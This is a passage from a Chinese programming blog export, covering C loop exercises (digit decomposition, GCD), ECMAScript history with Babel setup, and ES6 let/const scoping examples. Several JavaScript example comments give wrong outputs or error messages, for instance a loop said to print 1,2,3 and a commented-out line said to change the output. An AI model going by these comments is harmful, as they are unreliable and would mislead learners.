    <content><![CDATA[<h3 id="循环应用"><a href="#循环应用" class="headerlink" title="循环应用"></a>循环应用</h3><p><img src="/images/c%E8%AF%AD%E8%A8%80/5.3-001.bmp" alt="式子"></p><p><img src="/images/c%E8%AF%AD%E8%A8%80/5.3-002.bmp" alt="代码"></p><p><img src="/images/c%E8%AF%AD%E8%A8%80/5.3-003.bmp" alt="式子"></p><p><img src="/images/c%E8%AF%AD%E8%A8%80/5.3-004.bmp" alt="代码"></p><h3 id="正序分解整数"><a href="#正序分解整数" class="headerlink" title="正序分解整数"></a>正序分解整数</h3><ul><li>输入一个非负整数，正序输出它的每一位数字</li><li>输入：13425</li><li>输出：1 3 4 2 5</li></ul><h3 id="分解整数输出"><a href="#分解整数输出" class="headerlink" title="分解整数输出"></a>分解整数输出</h3><p><img src="/images/c%E8%AF%AD%E8%A8%80/5.3-005.bmp" alt="代码"></p><ul><li>还没解决结尾的空格问题！</li></ul><p><img src="/images/c%E8%AF%AD%E8%A8%80/5.3-006.bmp" alt="代码"></p><ul><li>但是是逆序的！</li></ul><h3 id="分解整数输出-1"><a href="#分解整数输出-1" class="headerlink" title="分解整数输出"></a>分解整数输出</h3><p><img src="/images/c%E8%AF%AD%E8%A8%80/5.3-007.bmp" alt="代码"></p><ul><li>如果能有这么一个mask</li></ul><p><img src="/images/c%E8%AF%AD%E8%A8%80/5.3-008.bmp" alt="代码"></p><ul><li>计算x的位数</li></ul><p><img src="/images/c%E8%AF%AD%E8%A8%80/5.3-009.bmp" alt="代码"></p><ul><li>pow？</li><li>#include &lt;math.h&gt;</li><li>pow是浮点运算，慢</li></ul><p><img src="/images/c%E8%AF%AD%E8%A8%80/5.3-010.bmp" alt="代码"></p><ul><li>直接算mask</li><li>mask=100000?</li><li>因为第一轮mask就是10了</li><li>怎么办？</li></ul><p><img src="/images/c%E8%AF%AD%E8%A8%80/5.3-011.bmp" alt="代码"></p><ul><li>改变循环的条件，让它少做一轮</li><li>但是最后的结果为什么不对？</li></ul><p><img src="/images/c%E8%AF%AD%E8%A8%80/5.3-012.bmp" alt="代码"></p><ul><li>因为x在第一个循环中被改变了</li><li>用另外的变量代替x做计算</li></ul><h3 id="求最大公约数"><a href="#求最大公约数" class="headerlink" title="求最大公约数"></a>求最大公约数</h3><ul><li>输入两个数a和b，输出它们的最⼤大公约数</li><li>输入：12 18</li><li>输出：6</li></ul><p><img src="/images/c%E8%AF%AD%E8%A8%80/5.3-013.bmp" alt="求最大公约数"></p><p>枚举</p><ol><li>设t为2；</li><li>如果u和v都能被t整除，则记下这个t</li><li>t加1后重复第2步，直到t等于u或v；</li><li>那么，曾经记下的最大的可以同时整除u和v的t就是gcd</li></ol><h3 id="辗转相除法"><a href="#辗转相除法" class="headerlink" title="辗转相除法"></a>辗转相除法</h3><ol><li>如果b等于0，计算结束，a就是最大公约数；</li><li>否则，计算a除以b的余数，让a等于b，而b等于那个余数；</li><li>回到第一步。</li></ol><p><img src="/images/c%E8%AF%AD%E8%A8%80/5.3-014.bmp" alt="辗转相除法"></p>]]></content>
      <categories>
        <category>C语言</category>
      </categories>
      <tags>
        <tag>C语言</tag>
      </tags>
  </entry>
  <entry>
    <title>01_ECMA介绍</title>
    <url>/%E5%89%8D%E7%AB%AF/ES6/4ba0bd93.html</url>
    <content><![CDATA[<h2 id="ECMA背景"><a href="#ECMA背景" class="headerlink" title="ECMA背景"></a>ECMA背景</h2><p>ECMAScript是一种由Ecma国际（前身为欧洲计算机制造商协会,英文名称是European Computer Manufacturers Association）通过ECMA-262标准化的脚本程序设计语言。这种语言在万维网上应用广泛，它往往被称为JavaScript或JScript，但实际上后两者是ECMA-262标准的实现和扩展。</p><p>ECMAScript 规范定义了一种脚本语言实现应该包含的内容，但是，因为它是可扩充的，所以其实现所提供的功能与这个最小集相比可能变化很大。 ECMAScript本身并不是一种脚本语言。正如在 Web 应用程序中执行有用操作的 bean 集合（例如，Netscape 的 AWT）是 Sun 的 JavaBean 规范的一种实现一样，JavaScript 是 ECMAScript 规范的一种实现。</p><h2 id="一分钟了解ECMAScript的发展历程"><a href="#一分钟了解ECMAScript的发展历程" class="headerlink" title="一分钟了解ECMAScript的发展历程"></a>一分钟了解ECMAScript的发展历程</h2><p>1996 年 11月<br>JavaScript 的创造者 Netscape 公司将 JavaScript 提交给标准化组织 ECMA（European Computer Manufacturers Association）。</p><p>1997年 ES1<br>ECMA 发布 262 号标准文件（ECMA-262），规定了浏览器脚本语言的标准，并将这种语言称为 ECMAScript (ES).</p><p>1998年 ES2<br>内容编辑加工，没有特性修改。</p><p>1999年 ES3<br>有较完善的修改，成为JavaScript的通行标准，得到了广泛支持。</p><p>2000年 ES4 , 2008年终止<br>也称作JavaScript 2，因改动太大没有通过，Harmony项目启动来跟进，ES4大部分内容被 ES6 继承. Harmony部分内容放到ES6之后。</p><p>2009年 ES5(ES3.1)<br>新功能主要包括：JSON对象（包含parse/stringify等方法）、Array和Object增加一些方法，严格模式（use strict），函数的bind方法。</p><p>2011年 ES5.1<br>成为 ISO 国际标准（ISO/IEC 16262:2011)， 到了2012年底，主流浏览器都支持ECMAScript 5.1的全部功能</p><p>2015年 ES2015(ES6)<br>做了大量的更新，但向后兼容。ES6是一次重大改进。<br>部分功能：let/const、变量的解构赋值、Promise、箭头函数…</p><p>2016年 ES2016(ES7)<br>新功能主要包括：<br>1.Array.prototype.includes检查数组中是否存在值；（区别ES6字符串的includes方法）<br>2.Exponentiation Operator 求幂运算 (a ** b等价于Math.pow(a,b))<br>规范地址：<a href="http://www.ecma-international.org/ecma-262/7.0/" target="_blank" rel="noopener">http://www.ecma-international.org/ecma-262/7.0/</a></p><p>2017年 ES2017(ES8)<br>部分功能：<br>1.Object.values/entries/getOwnPropertyDescriptors<br>2.String.prototype.padStart/padEnd<br>3.函数参数列表和调用中的尾逗号（Trailing commas）<br>4.Async Functions 异步函数（async/await）<br>规范地址：<a href="http://www.ecma-international.org/ecma-262/8.0/" target="_blank" rel="noopener">http://www.ecma-international.org/ecma-262/8.0/</a></p><h2 id="JavaScript标准的发展历程"><a href="#JavaScript标准的发展历程" class="headerlink" title="JavaScript标准的发展历程"></a>JavaScript标准的发展历程</h2><p>ECMAScript：一个由 ECMA International 进行标准化，TC39 委员会进行监督的语言。通常用于指代标准本身。<br>JavaScript：ECMAScript 标准的各种实现的最常用称呼。这个术语并不局限于某个特定版本的 ECMAScript 规范，并且可能被用于任何不同程度的任意版本的 ECMAScript 的实现。<br>ECMAScript 5 (ES5)：ECMAScript 的第五版修订，于 2009 年完成标准化。这个规范在所有现代浏览器中都相当完全的实现了。<br>ECMAScript 6 (ES6) / ECMAScript 2015 (ES2015)：ECMAScript 的第六版修订，于 2015 年完成标准化。这个标准被部分实现于大部分现代浏览器。可以查阅这张兼容性表来查看不同浏览器和工具的实现情况。<br>ECMAScript 2016：预计的第七版 ECMAScript 修订，计划于明年夏季发布。这份规范具体将包含哪些特性还没有最终确定<br>ECMAScript Proposals：被考虑加入未来版本 ECMAScript 标准的特性与语法提案，他们需要经历五个阶段：Strawman（稻草人），Proposal（提议），Draft（草案），Candidate（候选）以及 Finished （完成）。</p><h2 id="JavaScript的版本历程"><a href="#JavaScript的版本历程" class="headerlink" title="JavaScript的版本历程"></a>JavaScript的版本历程</h2><p>1997年7月，ECMAScript 1.0发布。<br>1998年6月，ECMAScript 2.0版发布。<br>1999年12月，ECMAScript 3.0版发布，成为JavaScript的通行标准，得到了广泛支持。<br>2007年10月，ECMAScript 4.0版草案发布，对3.0版做了大幅升级，预计次年8月发布正式版本。草案发布后，由于4.0版的目标过于激进，各方对于是否通过这个标准，发生了严重分歧。以Yahoo、Microsoft、Google为首的大公司，反对JavaScript的大幅升级，主张小幅改动；以JavaScript创造者Brendan Eich为首的Mozilla公司，则坚持当前的草案。<br>2008年7月，由于对于下一个版本应该包括哪些功能，各方分歧太大，争论过于激进，ECMA开会决定，中止ECMAScript 4.0的开发（即废除了这个版本），将其中涉及现有功能改善的一小部分，发布为ECMAScript 3.1，而将其他激进的设想扩大范围，放入以后的版本，由于会议的气氛，该版本的项目代号起名为Harmony（和谐）。会后不久，ECMAScript 3.1就改名为ECMAScript 5。<br>2009年12月，ECMAScript 5.0版正式发布。Harmony项目则一分为二，一些较为可行的设想定名为JavaScript.next继续开发，后来演变成ECMAScript 6；一些不是很成熟的设想，则被视为JavaScript.next.next，在更远的将来再考虑推出。TC39的总体考虑是，ECMAScript 5与ECMAScript 3基本保持兼容，较大的语法修正和新功能加入，将由JavaScript.next完成。当时，JavaScript.next指的是ECMAScript 6。第六版发布以后，将指ECMAScript 7。TC39预计，ECMAScript 5会在2013年的年中成为JavaScript开发的主流标准，并在此后五年中一直保持这个位置。<br>2011年6月，ECMAscript 5.1版发布，并且成为ISO国际标准（ISO/IEC 16262:2011）。到了2012年底，所有主要浏览器都支持ECMAScript 5.1版的全部功能。<br>2013年3月，ECMAScript 6草案冻结，不再添加新功能。新的功能设想将被放到ECMAScript 7。<br>2013年12月，ECMAScript 6草案发布。然后是12个月的讨论期，听取各方反馈。<br>2015年6月，ECMAScript 6正式发布，并且更名为“ECMAScript 2015”。这是因为TC39委员会计划，以后每年发布一个ECMAScirpt的版本，下一个版本在2016年发布，称为“ECMAScript 2016”。<br>除了ECMAScript的版本，很长一段时间中，Netscape公司（以及继承它的Mozilla基金会）在内部依然使用自己的版本号。这导致了JavaScript有自己不同于ECMAScript的版本号。1996年3月，Navigator 2.0内置了JavaScript 1.0。JavaScript 1.1版对应ECMAScript 1.0，但是直到JavaScript 1.4版才完全兼容ECMAScript 1.0。JavaScript 1.5版完全兼容ECMAScript 3.0。目前的JavaScript 1.8版完全兼容ECMAScript 5。</p><h2 id="ES语法提案的五个阶段："><a href="#ES语法提案的五个阶段：" class="headerlink" title="ES语法提案的五个阶段："></a>ES语法提案的五个阶段：</h2><p>Stage 0 - Strawman（展示阶段）<br>Stage 1 - Proposal（征求意见阶段）<br>Stage 2 - Draft（草案阶段）<br>Stage 3 - Candidate（候选人阶段）<br>Stage 4 - Finished（定案阶段）<br>提案地址:<a href="https://github.com/tc39/ecma262" target="_blank" rel="noopener">https://github.com/tc39/ecma262</a></p><h2 id="ES6环境"><a href="#ES6环境" class="headerlink" title="ES6环境"></a>ES6环境</h2><p>Chrome对新的语法支持很迅速，可以直接写js通过Chrom浏览器解析执行<br>转码器:webpack3.x Traceur</p><p>es6不像es5那么简单，它需要有es5的前置知识，要懂得es5的基本语法，跟es5不同的是，es6需要搭建环境，不像es5那样直接就可以编写运行，因为有些浏览器还是不支持es6的，所以还需要babel对其进行转换，接下来就开始环境的搭建吧。</p><p>首先选择一个盘新建目录文件，我新建的是es6文件夹，在该文件夹新建一个src文件，用来存放js文件，新建一个dist文件，用来存放转换为es5语法的js文件，还有建立一个index.html文件，src下新建一个index.js文件，在index.html中加入&lt;script src=”./dist”&gt;&lt;/script&gt;如下所示：<br><img src="/images/es6/es001.png" alt="ES6环境搭建"><br>然后对项目进行初始化，在控制台切换到该目录下，输入”npm init -y”即生成一个package.json文件，打开文件内容，下面是对里面内容的讲解：<br><img src="/images/es6/es002.png" alt="ES6环境搭建"><br><img src="/images/es6/es003.png" alt="ES6环境搭建"></p><p>然后开始环境的搭建：</p><p>先输入”npm install babel-cli -g”对bebal进行全局安装，如果网速较慢，可以使用cnpm<br>接着再输入”npm install –save-dev babel-preset-es2015 babel-cli“，将babel-preset-es2015和babel-cli进行本地安装，安装成功后就会在package.json文件中有记录，如图：<br><img src="/images/es6/es004.png" alt="ES6环境搭建"></p><p>接着新建一个.babelrc文件，在文件中输入：<br><img src="/images/es6/es005.png" alt="ES6环境搭建"></p><p>这时在控制台输入”babel src/index.js -o dist/index.js”，-o表示输出，即将src下的文件index.js通过babel转换器转换后输出到dist文件夹下的index.js文件。<br>以下是本次的测试：<br>src下的index.js<br><img src="/images/es6/es006.png" alt="ES6环境搭建"></p><p>dist下的index.js<br><img src="/images/es6/es007.png" alt="ES6环境搭建"></p><p>为了可以简化输入语句，可以通过在package.json文件中的scripts属性进行更改：<br><img src="/images/es6/es008.png" alt="ES6环境搭建"><br>这时只需要在控制台输入”npm run build”即可达到在控制台输入babel src/index.js -o dist/index.js相同的效果。</p>]]></content>
      <categories>
        <category>前端</category>
        <category>ES6</category>
      </categories>
      <tags>
        <tag>ES6</tag>
      </tags>
  </entry>
  <entry>
    <title>02_变量的定义</title>
    <url>/%E5%89%8D%E7%AB%AF/ES6/4f798200.html</url>
    <content><![CDATA[<h2 id="定义-声明变量"><a href="#定义-声明变量" class="headerlink" title="(定义)声明变量"></a>(定义)声明变量</h2><h3 id="var定义变量的一些问题"><a href="#var定义变量的一些问题" class="headerlink" title="var定义变量的一些问题:"></a>var定义变量的一些问题:</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script type=<span class="string">"text/javascript"</span>&gt;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">        <span class="comment">// TODO</span></span><br><span class="line">    &#125;</span><br><span class="line">    alert(i);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 下面使用i默认从10开始</span></span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><p>问题: i的结果是10。这里在之前的版本中，作用域分为：全局、函数作用域。<br>ES6:块级作用域</p><p>作用域问题</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script type=<span class="string">"text/javascript"</span>&gt;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">fn</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        alert(a);</span><br><span class="line">    &#125;</span><br><span class="line">    fn();</span><br><span class="line">    <span class="comment">// 报错:Uncaught ReferenceError: a is not defined</span></span><br><span class="line">    <span class="comment">// 这是正常情况</span></span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script type=<span class="string">"text/javascript"</span>&gt;</span><br><span class="line">    <span class="keyword">var</span> a = <span class="number">12</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">fn</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        alert(a);</span><br><span class="line">    &#125;</span><br><span class="line">    fn();</span><br><span class="line">    <span class="comment">// 弹出12</span></span><br><span class="line">    <span class="comment">// 正常情况</span></span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script type=<span class="string">"text/javascript"</span>&gt;</span><br><span class="line">    <span class="keyword">var</span> a = <span class="number">12</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">fn</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        alert(a);</span><br><span class="line">        <span class="keyword">var</span> a = <span class="number">5</span>;</span><br><span class="line">        <span class="comment">// 这是因为变量提升（预解析）,也是js的特性</span></span><br><span class="line">    &#125;</span><br><span class="line">    fn();</span><br><span class="line">    <span class="comment">// 弹出undefined</span></span><br><span class="line">    <span class="comment">// 类似于下面代码(当前这种情况是不好的，我们在ES6中不希望出现这种特性)</span></span><br><span class="line">    <span class="comment">// </span></span><br><span class="line">    <span class="keyword">var</span> a;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">fn</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">       <span class="keyword">var</span> a;</span><br><span class="line">       alert(a);</span><br><span class="line">       <span class="comment">// var a = 5;</span></span><br><span class="line">       a = <span class="number">5</span>; </span><br><span class="line">    &#125;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><h3 id="let和const"><a href="#let和const" class="headerlink" title="let和const"></a>let和const</h3><p>let: 类似与之前的var<br>const: 常量，定义好了不能改变<br>使用如下:</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script type=<span class="string">"text/javascript"</span>&gt;</span><br><span class="line">    <span class="keyword">let</span> a = <span class="number">12</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">fn</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(a);</span><br><span class="line">        <span class="comment">// 打印：12</span></span><br><span class="line">    &#125;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><h3 id="let和const定义的变量具备块级作用域-只要带有花括号都有-，如下："><a href="#let和const定义的变量具备块级作用域-只要带有花括号都有-，如下：" class="headerlink" title="let和const定义的变量具备块级作用域(只要带有花括号都有)，如下："></a>let和const定义的变量具备块级作用域(只要带有花括号都有)，如下：</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script type=<span class="string">"text/javascript"</span>&gt;</span><br><span class="line">    <span class="keyword">if</span>(<span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> a = <span class="number">12</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    alert(a);</span><br><span class="line">    <span class="comment">// 可以弹出12,能正常使用</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(<span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="keyword">let</span> b = <span class="number">12</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    alert(b);</span><br><span class="line">    <span class="comment">// 报错:Uncaught ReferenceError: b is not defined</span></span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><h3 id="没有预解析，不存在变量提升"><a href="#没有预解析，不存在变量提升" class="headerlink" title="没有预解析，不存在变量提升"></a>没有预解析，不存在变量提升</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script type=<span class="string">"text/javascript"</span>&gt;</span><br><span class="line">    <span class="keyword">let</span> a = <span class="number">12</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">fn</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        alert(a);  <span class="comment">// TDZ 开始 暂时性死区</span></span><br><span class="line">        <span class="keyword">let</span> a = <span class="number">5</span>; <span class="comment">// TDZ 结束</span></span><br><span class="line">        <span class="comment">// 代码块中有a则一定用的是代码块的a</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 报错:Uncaught ReferenceError: a is not defined</span></span><br><span class="line">    <span class="comment">// 因为fn函数内有a,但是alert的时候，a还没有定义。把let a = 5放在alert(a)；上面一行即可。</span></span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><h3 id="let不能被重复定义变量"><a href="#let不能被重复定义变量" class="headerlink" title="let不能被重复定义变量"></a>let不能被重复定义变量</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script type=<span class="string">"text/javascript"</span>&gt;</span><br><span class="line">    <span class="keyword">var</span> a = <span class="number">12</span>;</span><br><span class="line">    <span class="comment">// TODO</span></span><br><span class="line">    <span class="keyword">var</span> a = <span class="number">5</span>;</span><br><span class="line">    alert(a);</span><br><span class="line">    <span class="comment">// 弹出5，a被覆盖</span></span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script type=<span class="string">"text/javascript"</span>&gt;</span><br><span class="line">    <span class="keyword">let</span> a = <span class="number">12</span>;</span><br><span class="line">    <span class="comment">// TODO</span></span><br><span class="line">    <span class="keyword">let</span> a = <span class="number">5</span>;</span><br><span class="line">    alert(a);</span><br><span class="line">    <span class="comment">// 报错:Uncaught ReferenceError: Identifier 'a' has already been declared</span></span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><h3 id="for循环-for循环里面是父级作用域"><a href="#for循环-for循环里面是父级作用域" class="headerlink" title="for循环,for循环里面是父级作用域"></a>for循环,for循环里面是父级作用域</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script type=<span class="string">"text/javascript"</span>&gt;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">3</span>; i++) &#123;</span><br><span class="line">        <span class="comment">// TODO</span></span><br><span class="line">        <span class="comment">// 本区域可用</span></span><br><span class="line">    &#125;</span><br><span class="line">    alert(i);</span><br><span class="line">    <span class="comment">// 报错:Uncaught ReferenceError: a is not defined</span></span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><h3 id="具备块级作用域"><a href="#具备块级作用域" class="headerlink" title="具备块级作用域"></a>具备块级作用域</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script type=<span class="string">"text/javascript"</span>&gt;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">3</span>; i++) &#123;</span><br><span class="line">        <span class="comment">// TODO</span></span><br><span class="line">        <span class="built_in">console</span>.log(i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 循环打印三行1,2,3</span></span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script type=<span class="string">"text/javascript"</span>&gt;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">3</span>; i++) &#123;</span><br><span class="line">        <span class="comment">// TODO</span></span><br><span class="line">        <span class="comment">// let i = 'abc';</span></span><br><span class="line">        <span class="built_in">console</span>.log(i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 打印三次'abc'</span></span><br><span class="line">    <span class="comment">// 不是重复定义，for循环里面是父级作用域，内部重新定义则使用子级作用域</span></span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script type=<span class="string">"text/javascript"</span>&gt;</span><br><span class="line">    <span class="keyword">let</span> a = <span class="number">12</span>;</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">let</span> a = <span class="number">5</span>;</span><br><span class="line">        <span class="built_in">console</span>(a);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">console</span>(a);</span><br><span class="line">    <span class="comment">// 打印5</span></span><br><span class="line">    <span class="comment">// 打印12</span></span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><h3 id="相比var，let更符合程序运行流程"><a href="#相比var，let更符合程序运行流程" class="headerlink" title="相比var，let更符合程序运行流程"></a>相比var，let更符合程序运行流程</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script type=<span class="string">"text/javascript"</span>&gt;</span><br><span class="line">    <span class="keyword">var</span> arr = [];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">        arr[i] = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(i);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    arr[<span class="number">5</span>]();</span><br><span class="line">    <span class="comment">// 输出结果10，原因i是全局变量。</span></span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script type=<span class="string">"text/javascript"</span>&gt;</span><br><span class="line">    <span class="keyword">let</span> arr = [];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">        arr[i] = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(i);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    arr[<span class="number">5</span>]();</span><br><span class="line">    <span class="comment">// 输出结果5，原因i是全局变量。</span></span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><h3 id="获取选项卡案例"><a href="#获取选项卡案例" class="headerlink" title="获取选项卡案例"></a>获取选项卡案例</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"X-UA-Compatible"</span> <span class="attr">content</span>=<span class="string">"IE=edge"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">value</span>=<span class="string">"aaa"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">value</span>=<span class="string">"bbb"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">value</span>=<span class="string">"ccc"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span></span><br><span class="line">        </span><br><span class="line"><span class="javascript">        <span class="built_in">window</span>.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> aInput = <span class="built_in">document</span>.querySelectorAll(<span class="string">'input'</span>);</span></span><br><span class="line"></span><br><span class="line"><span class="javascript">            <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; aInput.length; i++) &#123;</span></span><br><span class="line"><span class="javascript">                aInput[i].onclick = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line">                    alert(i);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="javascript">        <span class="comment">// 点击哪个按钮弹出都是3，当把var换成let就彻底符合流程了</span></span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="let总结注意："><a href="#let总结注意：" class="headerlink" title="let总结注意："></a>let总结注意：</h2><p>1.没有预解析，不存在变量提升。在代码块内，只要let定义变量，在之前使用都会报错。必须先定义，在使用。<br>2.同一个作用域里，不能重复定义变量。<br>3.for循环,for循环里面是父级作用域，里面有一个</p><h2 id="const特性和let一样，const定义变量不能修改。"><a href="#const特性和let一样，const定义变量不能修改。" class="headerlink" title="const特性和let一样，const定义变量不能修改。"></a>const特性和let一样，const定义变量不能修改。</h2><h3 id="定义变量不能修改"><a href="#定义变量不能修改" class="headerlink" title="定义变量不能修改"></a>定义变量不能修改</h3><p>在某些开发中，如配置文件，一些定死不需要修改的变量，即常量</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script type=<span class="string">"text/javascript"</span>&gt;</span><br><span class="line">    <span class="keyword">let</span> http = <span class="built_in">require</span>(<span class="string">'http'</span>);</span><br><span class="line">    http = <span class="string">"a"</span>;</span><br><span class="line">    <span class="built_in">console</span>.log(http);</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script type=<span class="string">"text/javascript"</span>&gt;</span><br><span class="line">    <span class="keyword">const</span> http = <span class="built_in">require</span>(<span class="string">'http'</span>);</span><br><span class="line">    http = <span class="string">"a"</span>;</span><br><span class="line">    <span class="built_in">console</span>.log(http);</span><br><span class="line">    <span class="comment">// 报错:Uncaught TypeError: Assignment to constant variable.</span></span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><h3 id="const定义完变量，必须有值，不能后赋值，不能修改"><a href="#const定义完变量，必须有值，不能后赋值，不能修改" class="headerlink" title="const定义完变量，必须有值，不能后赋值，不能修改"></a>const定义完变量，必须有值，不能后赋值，不能修改</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script type=<span class="string">"text/javascript"</span>&gt;</span><br><span class="line">    <span class="keyword">const</span> a = <span class="number">123</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(a); <span class="comment">// TDZ 暂时性死区</span></span><br><span class="line">        <span class="keyword">const</span> a = <span class="number">5</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    show();</span><br><span class="line">    <span class="comment">// 